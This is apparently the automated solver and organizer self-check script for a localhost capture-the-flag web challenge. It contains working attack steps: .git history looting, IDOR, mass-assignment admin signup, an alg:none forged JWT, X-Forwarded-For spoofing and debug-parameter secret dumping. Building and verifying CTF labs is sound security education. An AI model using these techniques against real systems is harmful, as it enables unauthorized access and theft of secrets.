#!/usr/bin/env bash
# ============================================================================
#  Dropspot CTF — automated solver / organizer self-check.
#  Walks every "obvious once you see it" bug. Needs curl, git, python3, unzip.
#      WEB_PORT=8095 ./scripts/verify.sh
#  Exits 0 only if all 7 core flags are captured.
# ============================================================================
set -u
B="http://localhost:${WEB_PORT:-8080}"
pass=0; fail=0
ok(){ echo "  [PASS] $1"; pass=$((pass+1)); }
no(){ echo "  [FAIL] $1"; fail=$((fail+1)); }
grabf(){ grep -o 'DS{[^}]*}' | head -1; }

echo "== target: $B =="

echo "[*] Recon — robots.txt hands you the 'hidden' paths"
curl -s "$B/robots.txt" | sed -n 's/^/    /p'

echo "[*] Bonus — flag in the HTML source comment"
curl -s "$B/" | grabf | sed 's/^/    /'
echo "[*] Bonus — flag in a response header"
curl -sI "$B/" | grep -i x-powered-by | grabf | sed 's/^/    /'

echo "[1] Exposed .git — secrets live in history"
TMP="$(mktemp -d)"; git clone -q "$B/.git" "$TMP/loot" 2>/dev/null
F1="$(git -C "$TMP/loot" log -p 2>/dev/null | grabf)"; rm -rf "$TMP"
echo "    $F1"; [[ "$F1" == DS\{* ]] && ok "FLAG 1 (.git history)" || no "FLAG 1 (.git history)"

echo "[2] IDOR — /d/<id>, just change the number"
F2="$(curl -s "$B/d/1" | grabf)"; echo "    $F2"
[[ "$F2" == DS\{* ]] && ok "FLAG 2 (IDOR)" || no "FLAG 2 (IDOR)"

echo "[3] Mass assignment — set your own role on signup"
F3="$(curl -s -X POST "$B/api/register" -H 'Content-Type: application/json' \
      -d '{"username":"pwn","password":"x","role":"admin"}' | grabf)"
echo "    $F3"; [[ "$F3" == DS\{* ]] && ok "FLAG 3 (mass assignment)" || no "FLAG 3 (mass assignment)"

echo "[4] JWT alg:none — unsigned admin token"
TOK="$(python3 -c 'import base64,json
b=lambda o:base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode()
print(b({"alg":"none","typ":"JWT"})+"."+b({"username":"admin","role":"admin"})+".")')"
F4="$(curl -s "$B/api/me" -H "Authorization: Bearer $TOK" | grabf)"
echo "    $F4"; [[ "$F4" == DS\{* ]] && ok "FLAG 4 (alg:none)" || no "FLAG 4 (alg:none)"

echo "[5] X-Forwarded-For — 'localhost only' is just a header you send"
F5="$(curl -s "$B/admin-x9z1/internal" -H 'X-Forwarded-For: 127.0.0.1' | grabf)"
echo "    $F5"; [[ "$F5" == DS\{* ]] && ok "FLAG 5 (XFF spoof)" || no "FLAG 5 (XFF spoof)"

echo "[6] Debug left on — ?debug=1 dumps secrets"
F6="$(curl -s "$B/api/config?debug=1" | grabf)"
echo "    $F6"; [[ "$F6" == DS\{* ]] && ok "FLAG 6 (debug)" || no "FLAG 6 (debug)"

echo "[7] backup.zip in the webroot"
TZ="$(mktemp)"; curl -s "$B/uploads/backup.zip" -o "$TZ"
F7="$(unzip -p "$TZ" dropspot_backup/flag.txt 2>/dev/null | grabf)"; rm -f "$TZ"
echo "    $F7"; [[ "$F7" == DS\{* ]] && ok "FLAG 7 (backup.zip)" || no "FLAG 7 (backup.zip)"

echo
echo "================  flags  ================"
for v in F1 F2 F3 F4 F5 F6 F7; do echo "  $v : ${!v:-<missing>}"; done
echo "========================================"
echo "  passed=$pass failed=$fail"
[[ "$F1" == DS\{* && "$F2" == DS\{* && "$F3" == DS\{* && "$F4" == DS\{* \
   && "$F5" == DS\{* && "$F6" == DS\{* && "$F7" == DS\{* ]]
